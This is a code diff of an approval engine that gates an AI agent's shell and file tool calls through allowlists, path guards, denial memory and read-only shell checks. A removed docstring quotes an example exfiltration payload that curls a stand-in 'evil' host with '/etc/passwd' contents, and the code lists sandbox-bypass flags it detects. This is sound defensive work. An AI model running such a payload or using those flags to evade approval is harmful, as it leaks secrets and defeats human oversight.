@@ -27,6 +27,7 @@ from opc.layer2_organization.data_acquisition_policy import (
     is_projection_scoped_acquisition_shell_command,
 )
 from opc.layer2_organization.escalation import EscalationEngine
+from opc.layer2_organization import shell_safety
 from opc.layer2_organization.work_item_identity import (
     work_item_identity_payload_for_task,
     work_item_projection_id_from_metadata,
@@ -39,12 +40,17 @@ from opc.llm.provider import LLMProvider
 from opc.llm.retry import LLMRetryError, call_llm_json_with_retry
 
 
-_SHELL_CONTROL_TOKENS = {"&&", "||", ";", "|", "&"}
-# Redirections that cannot write to a real file: fd duplication (2>&1, >&2)
-# and discarding output into /dev/null. Everything else keeps counting as a
-# redirection for the safe-prefix check.
-_SAFE_REDIRECTION_RE = re.compile(r"(?:\d?>>?\s*/dev/null\b|\d?>&\d|&>>?\s*/dev/null\b)")
 _LOW_RISK_SHELL_PREFIXES = set(ACQUISITION_SHELL_PREFIXES)
+_SHELL_LIKE_TOOL_NAMES = {"shell_exec", "python_exec", "git_commit"}
+_PREDICT_PATH_KEYS = (
+    "path",
+    "file_path",
+    "directory",
+    "working_directory",
+    "target_output_dir",
+    "workspace_path",
+)
+_PREDICT_COMMAND_KEYS = ("command", "cmd")
 _EXTERNAL_AGENT_DIRECT_HUMAN_MARKERS = (
     "--dangerously-bypass-approvals-and-sandbox",
     "--dangerously-skip-permissions",
@@ -125,6 +131,7 @@ class ApprovalEngine:
         opc_home = getattr(preferences, "opc_home", None)
         self.allowlist = ApprovalAllowlistManager(opc_home) if opc_home else None
         self._session_allowlist: dict[str, dict[str, dict[str, list[str]]]] = {}
+        self._denial_counts: dict[str, int] = {}
         if self.allowlist:
             self.allowlist.ensure_file()
 
@@ -321,6 +328,310 @@ class ApprovalEngine:
         if reply == "always_global":
             return PermissionScope.GLOBAL
         return PermissionScope.ONCE
+
+    # ------------------------------------------------------------------
+    # Synchronous permission prediction (runtime fast path)
+    #
+    # The native runtime consults predict() before every tool call: ALLOW
+    # executes immediately, DENY blocks, ASK routes into the full async
+    # authorize_tool_call() pipeline (allowlist, heuristics, LLM review,
+    # escalation card). predict() reads the same config and the same
+    # persisted allowlist as authorize, so there is exactly one policy.
+    # ------------------------------------------------------------------
+
+    def predict(
+        self,
+        tool: Any,
+        arguments: dict[str, Any] | None = None,
+        *,
+        task: Task | None = None,
+    ) -> RuntimePermissionDecision:
+        p2 = self.config.permissions_v2
+        if tool is None:
+            return self._predict_decision(
+                PermissionResolution.ASK if p2.fail_closed else PermissionResolution.DENY,
+                RiskLevel.HIGH,
+                "Unknown tool requires manual review.",
+                source="runtime_prediction",
+            )
+        if not self.config.enabled or not p2.enabled:
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Autonomy policy is disabled.", source="config",
+            )
+        tool_name = str(getattr(tool, "name", "") or "")
+        args = dict(arguments or {})
+
+        repeated = self._repeated_denial_decision(tool_name, args)
+        if repeated is not None:
+            return repeated
+        if tool_name in {str(item or "").strip() for item in p2.deny_tools if str(item or "").strip()}:
+            return self._predict_decision(
+                PermissionResolution.DENY, RiskLevel.HIGH,
+                "Tool is explicitly denied by permission rules.", source="permission_rules",
+            )
+        if tool_name in COMPANY_APPROVAL_EXEMPT_TOOL_NAMES:
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Built-in company collaboration tool is always auto-approved.",
+                source="company_tool_policy",
+            )
+        if self._memory_path_decision("tool", tool_name, {"arguments": args}):
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Direct agent access to canonical OpenOPC memory files.",
+                source="memory_path_policy",
+            )
+        if tool_name in {str(item or "").strip() for item in p2.allow_tools if str(item or "").strip()}:
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Tool is explicitly allowed by permission rules.", source="permission_rules",
+            )
+
+        # Persisted human grants win before path/shell heuristics, matching
+        # the order of the async authorize pipeline. Unauditable commands
+        # cannot ride through: their candidates degrade to the exact string.
+        metadata = {"arguments": args}
+        session_hit = self._lookup_session_allowlist_policy(
+            task=task, action_kind="tool", action_name=tool_name, metadata=metadata,
+        )
+        if session_hit:
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                f"Allowed by session approval ({session_hit['scope']}).",
+                source="session_approval", scope=PermissionScope.SESSION,
+            )
+        persisted_hit = self._lookup_allowlist_policy(
+            action_kind="tool", action_name=tool_name, metadata=metadata,
+            project_id=task.project_id if task else None,
+        )
+        if persisted_hit:
+            scope = PermissionScope.GLOBAL if persisted_hit["scope"] is None else PermissionScope.PROJECT
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Allowed by persisted allowlist grant.",
+                source="approval_allowlist", scope=scope,
+            )
+
+        path_decision = self._predict_path_decision(tool, args, task)
+        if path_decision is not None:
+            return path_decision
+
+        if tool_name in _SHELL_LIKE_TOOL_NAMES:
+            shell_decision = self._predict_shell_decision(tool_name, args, task)
+            if shell_decision is not None:
+                return shell_decision
+
+        if bool(getattr(tool, "requires_confirmation", False)):
+            return self._predict_decision(
+                PermissionResolution.ASK, RiskLevel.MEDIUM,
+                "Tool is marked as requiring confirmation.", source="runtime_prediction",
+            )
+        guardian = p2.guardian
+        if guardian.enabled and guardian.auto_allow_read_only and bool(getattr(tool, "read_only", False)):
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Deterministic read-only tool.", source="guardian",
+            )
+        return self._predict_decision(
+            PermissionResolution.ALLOW, RiskLevel.LOW,
+            "No permission warning triggered.", source="runtime_prediction",
+        )
+
+    def record_denial(self, tool_name: str, arguments: dict[str, Any] | None = None) -> None:
+        if not self.config.permissions_v2.denial_memory.enabled:
+            return
+        key = self._denial_memory_key(tool_name, arguments)
+        self._denial_counts[key] = self._denial_counts.get(key, 0) + 1
+
+    def _denial_memory_key(self, tool_name: str, arguments: dict[str, Any] | None) -> str:
+        args = dict(arguments or {})
+        for key in (*_PREDICT_PATH_KEYS, *_PREDICT_COMMAND_KEYS, "url"):
+            value = str(args.get(key, "") or "").strip()
+            if value:
+                return f"{tool_name}:{value}"
+        return f"{tool_name}:*"
+
+    def _repeated_denial_decision(
+        self, tool_name: str, arguments: dict[str, Any] | None
+    ) -> RuntimePermissionDecision | None:
+        memory = self.config.permissions_v2.denial_memory
+        if not memory.enabled:
+            return None
+        repeats = self._denial_counts.get(self._denial_memory_key(tool_name, arguments), 0)
+        if repeats < max(1, memory.repeat_threshold):
+            return None
+        return self._predict_decision(
+            PermissionResolution.DENY, RiskLevel.HIGH,
+            "Repeated denials indicate this action should stop and ask for a new plan.",
+            source="denial_memory",
+            metadata={"repeated_denials": repeats},
+        )
+
+    def _predict_shell_decision(
+        self,
+        tool_name: str,
+        args: dict[str, Any],
+        task: Task | None,
+    ) -> RuntimePermissionDecision | None:
+        command = ""
+        for key in _PREDICT_COMMAND_KEYS:
+            value = str(args.get(key, "") or "").strip()
+            if value:
+                command = value
+                break
+        if not command:
+            return None
+        for pattern in self.config.permissions_v2.dangerous_shell_patterns:
+            if pattern and re.search(pattern, command, flags=re.IGNORECASE):
+                return self._predict_decision(
+                    PermissionResolution.ASK, RiskLevel.CRITICAL,
+                    f"Command matched dangerous shell pattern `{pattern}`.",
+                    source="shell_pattern",
+                )
+        if is_projection_scoped_acquisition_shell_command(
+            command=command,
+            task=task,
+            working_directory=str(args.get("working_directory", "") or args.get("workdir", "") or "").strip(),
+            target_output_dir=str((getattr(task, "metadata", {}) or {}).get("target_output_dir", "") or "").strip() if task else "",
+        ):
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Work-item-scoped acquisition command inside the assigned workspace.",
+                source="shell_prefix",
+            )
+        safe_prefixes = [
+            item for item in self.config.safe_command_prefixes
+            if str(item or "").strip() not in _LOW_RISK_SHELL_PREFIXES
+        ]
+        safe, reason = shell_safety.is_read_only_shell_command(command, safe_prefixes)
+        if safe:
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                reason, source="shell_read_only",
+            )
+        return self._predict_decision(
+            PermissionResolution.ASK, RiskLevel.MEDIUM,
+            f"Shell command requires approval review: {reason}",
+            source="shell_guard",
+        )
+
+    def _predict_path_decision(
+        self,
+        tool: Any,
+        args: dict[str, Any],
+        task: Task | None,
+    ) -> RuntimePermissionDecision | None:
+        if not args:
+            return None
+        p2 = self.config.permissions_v2
+        candidate = ""
+        for key in _PREDICT_PATH_KEYS:
+            value = str(args.get(key, "") or "").strip()
+            if value:
+                candidate = value
+                break
+        if not candidate:
+            return None
+        if self._matches_path_rule(candidate, p2.denied_paths):
+            return self._predict_decision(
+                PermissionResolution.DENY, RiskLevel.HIGH,
+                "Target path matches a denied permission rule.", source="permission_rules",
+            )
+        if self._matches_path_rule(candidate, p2.allowed_paths):
+            return self._predict_decision(
+                PermissionResolution.ALLOW, RiskLevel.LOW,
+                "Target path matches an explicit allow rule.", source="permission_rules",
+                scope=PermissionScope.PROJECT,
+            )
+        if bool(getattr(tool, "read_only", False)):
+            return None
+        try:
+            resolved = Path(candidate).resolve()
+        except Exception:
+            return None
+        for root in self._predict_workspace_roots(task):
+            if resolved == root or root in resolved.parents:
+                return None
+        return self._predict_decision(
+            PermissionResolution.ASK if p2.fail_closed else PermissionResolution.DENY,
+            RiskLevel.HIGH,
+            "Target path is outside the current workspace roots.",
+            source="path_guard",
+            metadata={"candidate": candidate},
+        )
+
+    @staticmethod
+    def _matches_path_rule(candidate: str, rules: list[str]) -> bool:
+        raw = str(candidate or "").strip()
+        if not raw or raw == "*":
+            return False
+        for rule in rules:
+            token = str(rule or "").strip()
+            if not token:
+                continue
+            if token == "*" or raw == token:
+                return True
+            try:
+                rule_path = Path(token).resolve()
+                candidate_path = Path(raw).resolve()
+            except Exception:
+                if raw.startswith(token.rstrip("\\/")):
+                    return True
+                continue
+            if candidate_path == rule_path or rule_path in candidate_path.parents:
+                return True
+        return False
+
+    @staticmethod
+    def _predict_workspace_roots(task: Task | None) -> list[Path]:
+        roots: list[Path] = []
+        metadata = getattr(task, "metadata", {}) or {} if task else {}
+        for raw in (
+            str(metadata.get("workspace_root", "") or "").strip(),
+            str(metadata.get("comms_workspace_root", "") or "").strip(),
+            str(metadata.get("output_root", "") or "").strip(),
+            str(metadata.get("target_output_dir", "") or "").strip(),
+        ):
+            if not raw:
+                continue
+            try:
+                path = Path(raw).resolve()
+            except Exception:
+                continue
+            if path not in roots:
+                roots.append(path)
+        try:
+            memory_root = (Path(get_opc_home()) / "memory").resolve()
+            if memory_root not in roots:
+                roots.append(memory_root)
+        except Exception:
+            pass
+        if not roots:
+            try:
+                roots.append(Path.cwd().resolve())
+            except Exception:
+                pass
+        return roots
+
+    @staticmethod
+    def _predict_decision(
+        resolution: PermissionResolution,
+        risk: RiskLevel,
+        rationale: str,
+        *,
+        source: str,
+        scope: PermissionScope = PermissionScope.ONCE,
+        metadata: dict[str, Any] | None = None,
+    ) -> RuntimePermissionDecision:
+        return RuntimePermissionDecision(
+            resolution=resolution,
+            scope=scope,
+            risk_level=risk,
+            rationale=rationale,
+            source=source,
+            metadata=dict(metadata or {}),
+        )
 
     async def _authorize(
         self,
@@ -820,7 +1131,7 @@ class ApprovalEngine:
             arguments = metadata.get("arguments", {})
             if action_name == "shell_exec" and isinstance(arguments, dict):
                 command = str(arguments.get("command", "")).strip()
-                commands, _ = self._extract_shell_command_targets(command)
+                commands, _ = self._shell_grant_targets(command)
                 if commands:
                     return commands
                 preview = self._command_preview(command)
@@ -863,7 +1174,7 @@ class ApprovalEngine:
         if action_kind == "tool":
             arguments = metadata.get("arguments", {})
             if action_name == "shell_exec" and isinstance(arguments, dict):
-                _, prefixes = self._extract_shell_command_targets(str(arguments.get("command", "")).strip())
+                _, prefixes = self._shell_grant_targets(str(arguments.get("command", "")).strip())
                 if prefixes:
                     return prefixes
                 preview = self._command_preview(arguments.get("command"))
@@ -872,93 +1183,70 @@ class ApprovalEngine:
 
         return ["*"]
 
-    def _extract_shell_command_targets(self, command: str) -> tuple[list[str], list[str]]:
+    def _shell_grant_targets(self, command: str) -> tuple[list[str], list[str]]:
+        """Derive allowlist candidates (full per-segment commands) and grant
+        patterns (word-boundary prefixes) for a shell command.
+
+        Only the segments that actually need approval are returned: read-only
+        safe segments (`ls` / `echo` / verification `cat`s chained after a
+        granted command) pass on their own merit and must neither break the
+        every-candidate-must-match rule nor be persisted as grants.
+
+        Fail closed: a command containing substitution we cannot audit, or one
+        that does not tokenize, is only ever grantable as its exact normalized
+        string — never as a broad prefix.
+        """
+        raw = " ".join(str(command or "").split()).strip()
+        if not raw:
+            return [], []
+        sanitized, expansions_safe = shell_safety.sanitize_expansions(raw)
+        sanitized = shell_safety.strip_safe_redirections(sanitized)
+        segments = shell_safety.split_shell_segments(sanitized) if expansions_safe else None
+        if not segments:
+            return [raw], [raw]
+        safe_prefixes = [
+            item for item in self.config.safe_command_prefixes
+            if str(item or "").strip() not in _LOW_RISK_SHELL_PREFIXES
+        ]
         commands: list[str] = []
         prefixes: list[str] = []
-        for tokens in self._split_shell_command_segments(command):
+        all_commands: list[str] = []
+        all_prefixes: list[str] = []
+        for tokens in segments:
             full = " ".join(tokens).strip()
-            if full:
-                commands.append(full)
+            if not full:
+                continue
             prefix_tokens = self._shell_command_prefix(tokens)
             prefix = " ".join(prefix_tokens).strip()
-            if prefix:
-                prefixes.append(prefix)
+            if prefix_tokens and prefix_tokens[0] in shell_safety.UNGRANTABLE_PREFIX_HEADS:
+                # "always allow bash/eval/sudo ..." would be a blank check;
+                # degrade to the exact command.
+                prefix = full
+            all_commands.append(full)
+            all_prefixes.append(prefix or full)
+            if not shell_safety.is_read_only_shell_command(full, safe_prefixes)[0]:
+                commands.append(full)
+                prefixes.append(prefix or full)
         if not commands:
-            preview = self._command_preview(command)
-            if preview:
-                commands.append(preview)
-                prefixes.append(preview)
+            # Fully read-only command: grants are moot, but keep the raw
+            # targets so callers still have a meaningful display candidate.
+            commands, prefixes = all_commands, all_prefixes
         return list(dict.fromkeys(commands)), list(dict.fromkeys(prefixes))
 
-    def _command_has_redirection(self, command: str) -> bool:
-        text = str(command or "").replace("\r\n", "\n").replace("\n", " ; ").strip()
-        if not text:
-            return False
-        try:
-            lexer = shlex.shlex(text, posix=True, punctuation_chars=";&|<>")
-            lexer.whitespace_split = True
-            lexer.commenters = ""
-            tokens = list(lexer)
-        except ValueError:
-            return any(marker in text for marker in (">", "<"))
-        return any(token in {">", ">>", "<", "<<"} for token in tokens)
-
     def _command_has_shell_substitution(self, command: str) -> bool:
-        """Detect shell command substitution / dynamic eval inside a command.
-
-        ``curl``, ``echo``, ``find`` and friends appear in ``safe_command_prefixes``,
-        so a command whose first token matches one of them is auto-approved as LOW risk.
-        Without this check, a payload such as ``curl http://evil/$(cat /etc/passwd)``
-        tokenizes to a single segment beginning with ``curl`` — bash expands the
-        ``$(...)`` before invoking curl, silently exfiltrating data with no human/LLM
-        review. The shlex tokenizer used here treats ``$`` as an ordinary character, so
-        command substitution must be flagged explicitly.
-        """
-        text = str(command or "")
-        if "$(" in text or "`" in text:
+        """True when a command contains dynamic constructs (unauditable
+        ``$(...)``, backticks, process substitution, ``eval``/``source``) that
+        must never ride through on a safe prefix or a persisted grant."""
+        if shell_safety.has_blocked_substitution(command):
             return True
-        # ``eval`` / ``source`` let a "safe" prefix execute an arbitrary follow-up
-        # arg, but only when they are the command itself. As ordinary arguments
-        # (``grep source config.py``) they are inert; flagging them there only
-        # produces false approval prompts.
-        for tokens in self._split_shell_command_segments(text):
-            if tokens and tokens[0] in {"eval", "source", "."}:
-                return True
-        return False
+        segments = shell_safety.split_shell_segments(command)
+        if segments is None:
+            return True
+        return any(tokens and tokens[0] in {"eval", "source", "."} for tokens in segments)
 
     def _command_matches_safe_prefix(self, command: str, prefixes: list[str]) -> bool:
-        cleaned = " ".join(str(command or "").split()).strip()
-        if not cleaned:
-            return False
-        # Discarding stderr or duplicating fds writes nothing, and agents
-        # habitually append `2>&1` / `2>/dev/null` to read-only commands; strip
-        # those before the redirection check so they alone do not disqualify a
-        # command. Anything else touching `>`/`>>`/`<` still fails.
-        sanitized = _SAFE_REDIRECTION_RE.sub(" ", cleaned)
-        if self._command_has_redirection(sanitized):
-            return False
-        if self._command_has_shell_substitution(sanitized):
-            return False
-        commands, command_prefixes = self._extract_shell_command_targets(sanitized)
-        if not commands or not command_prefixes:
-            return False
-        candidates = [
-            candidate
-            for candidate in (str(item or "").strip().casefold() for item in prefixes)
-            if candidate
-        ]
-        if not candidates:
-            return False
-        # A compound command (`ls a && echo --- && ls b`, `git status | head`)
-        # qualifies only when every segment independently matches a safe prefix.
-        for prefix in command_prefixes:
-            normalized_prefix = prefix.casefold()
-            if not any(
-                normalized_prefix == candidate or normalized_prefix.startswith(f"{candidate} ")
-                for candidate in candidates
-            ):
-                return False
-        return True
+        safe, _ = shell_safety.is_read_only_shell_command(command, prefixes)
+        return safe
 
     def _is_low_risk_shell_first_use_exempt(self, action_name: str, metadata: dict[str, Any]) -> bool:
         if action_name != "shell_exec":
@@ -977,35 +1265,18 @@ class ApprovalEngine:
             target_output_dir=str(metadata.get("target_output_dir", "") or "").strip(),
         )
 
-    def _split_shell_command_segments(self, command: str) -> list[list[str]]:
-        text = str(command or "").replace("\r\n", "\n").replace("\n", " ; ").strip()
-        if not text:
-            return []
-        try:
-            lexer = shlex.shlex(text, posix=True, punctuation_chars=";&|")
-            lexer.whitespace_split = True
-            lexer.commenters = ""
-            tokens = list(lexer)
-        except ValueError:
-            try:
-                tokens = shlex.split(text)
-            except ValueError:
-                tokens = text.split()
-
-        segments: list[list[str]] = []
-        current: list[str] = []
-        for token in tokens:
-            if token in _SHELL_CONTROL_TOKENS:
-                if current:
-                    segments.append(current)
-                    current = []
-                continue
-            current.append(token)
-        if current:
-            segments.append(current)
-        return segments
-
     def _shell_command_prefix(self, tokens: list[str]) -> list[str]:
+        # Interpreter inline-code / module runs keep the flag in the prefix so
+        # a grant reads `python3 -c` (all inline snippets) or `python -m pip`
+        # (that module) instead of a blanket `python3`.
+        if tokens and tokens[0] in {"python", "python3", "python2", "node", "bun", "deno", "ruby", "perl"}:
+            for index in (1, 2):
+                if index >= len(tokens):
+                    break
+                if tokens[index] in {"-c", "-e"}:
+                    return [tokens[0], tokens[index]]
+                if tokens[index] == "-m" and index + 1 < len(tokens):
+                    return [tokens[0], "-m", tokens[index + 1]]
         semantic = self._shell_semantic_tokens(tokens)
         for length in range(len(semantic), 0, -1):
             prefix = " ".join(semantic[:length])
@@ -1149,9 +1420,19 @@ class ApprovalEngine:
                 item for item in self.config.safe_command_prefixes
                 if projection_scoped_low_risk or str(item or "").strip() not in _LOW_RISK_SHELL_PREFIXES
             ]
+            # The read-only audit must see the ORIGINAL command text: the
+            # preview used for keyword scans re-joins shlex tokens and drops
+            # quotes, turning e.g. `echo "<EOF>"` into `echo <EOF>` where the
+            # bare `<` reads as a redirection and misclassifies the command.
+            arguments = metadata.get("arguments", {})
+            raw_command = (
+                str(arguments.get("command", "") or arguments.get("cmd", "") or "").strip()
+                if isinstance(arguments, dict)
+                else ""
+            ) or command
             if projection_scoped_low_risk:
                 reasons.append("Command matches a projection-scoped acquisition prefix inside the assigned workspace.")
-            elif self._command_matches_safe_prefix(command, safe_prefixes):
+            elif self._command_matches_safe_prefix(raw_command, safe_prefixes):
                 reasons.append("Command matches known low-risk prefix.")
             elif risk == RiskLevel.LOW:
                 risk = RiskLevel.MEDIUM
@@ -1611,6 +1892,21 @@ class ApprovalEngine:
             session_scope_id = self._approval_session_scope_id(task)
             if session_scope_id:
                 allowlist_scope = f"session:{session_scope_id}"
+        elif reply == "approve_once" and allowlist_enabled and action_kind == "tool":
+            # "Approve once" still records the exact blocked candidates as a
+            # session grant: repeating the identical action in this session
+            # must not re-prompt, but nothing broader is granted.
+            once_patterns = approval_context.get("candidates") or allowlist_patterns
+            if once_patterns:
+                saved_patterns = self._add_session_patterns(
+                    task=task,
+                    action_kind=action_kind,
+                    action_name=action_name,
+                    patterns=list(once_patterns),
+                )
+                session_scope_id = self._approval_session_scope_id(task)
+                if saved_patterns and session_scope_id:
+                    allowlist_scope = f"session:{session_scope_id}"
         elif reply == "always_project" and self.allowlist:
             saved_patterns = self.allowlist.add_patterns(
                 action_kind=action_kind,
@@ -1691,7 +1987,7 @@ class ApprovalEngine:
                 patterns=allowlist_patterns,
             )
             scope = f"session:{session_scope_id}"
-        elif normalized_reply == "approve_once" and session_scope_id:
+        elif normalized_reply == "approve_once" and session_scope_id and action_kind == "tool":
             # No one-shot grant store exists; the narrowest durable equivalent
             # is a session grant for the exact blocked command(s), so the
             # resumed run passes without widening approval to the whole family.
